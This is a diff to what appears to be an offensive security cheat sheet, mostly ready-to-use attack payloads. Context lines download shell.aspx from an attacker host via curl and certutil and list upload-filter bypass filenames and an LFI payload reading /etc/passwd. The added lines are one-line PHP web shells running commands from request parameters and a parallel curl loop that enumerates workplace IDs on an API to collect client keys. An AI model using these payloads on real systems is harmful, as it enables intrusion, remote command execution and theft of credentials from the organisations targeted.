@@ -124,6 +124,10 @@ curl http://$MYIP:8888/shell.aspx -o shell.aspx
 certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
 
 ## Web
+[*] Curl
+cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
+cat 000-500 | xargs -P 30 -I{} sh -c 'curl https://api.app.com/workplaces/{} -H "Api-Version: 3.0" -s | jq -r "[.id, .clientName, .clientKey] | @csv"'
+
 [*] Web Shell
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
@@ -152,6 +156,10 @@ shell.P.phpHP
 shell%2EPHP
 shell%2Ephar%00%2Epng
 shell%2Ephar%00.png
+<?php echo passthru($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
 
 [*] LFI
 index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd
